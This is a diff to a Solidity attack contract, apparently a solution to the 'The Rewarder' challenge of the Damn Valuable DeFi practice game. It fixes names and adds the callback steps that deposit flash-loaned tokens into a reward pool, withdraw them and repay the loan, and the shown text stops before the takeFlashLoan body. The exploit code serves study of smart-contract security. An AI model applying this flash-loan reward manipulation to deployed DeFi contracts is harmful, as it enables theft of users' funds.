@@ -4,11 +4,12 @@ pragma solidity ^0.8.0;
 
 import "../DamnValuableToken.sol";
 import "./TheRewarderPool.sol";
+import "./FlashLoanerPool.sol";
 
 contract AttackTheRewarder {
     DamnValuableToken public liquidityToken;
-    rewarderPool public TheRewarderPool;
-    pool public flashLoanerPool;
+    TheRewarderPool public rewarderPool;
+    FlashLoanerPool public pool;
 
     constructor(
         address liquidityTokenAddress,
@@ -17,13 +18,15 @@ contract AttackTheRewarder {
     ) {
         liquidityToken = DamnValuableToken(liquidityTokenAddress);
         rewarderPool = TheRewarderPool(rewarderPoolAddress);
-        pool = flashLoanerPool(flashLoanerPoolAddress);
+        pool = FlashLoanerPool(flashLoanerPoolAddress);
     }
 
     function receiveFlashLoan(uint256 amount) public {
+        // called by the FlashLoanerPool
+        liquidityToken.approve(address(rewarderPool), amount);
         rewarderPool.deposit(amount);
         rewarderPool.withdraw(amount);
-        liquidityToken.transfer(address(flashLoanerPool), amount);
+        liquidityToken.transfer(address(pool), amount);
     }
 
     function takeFlashLoan(uint256 amount) public {
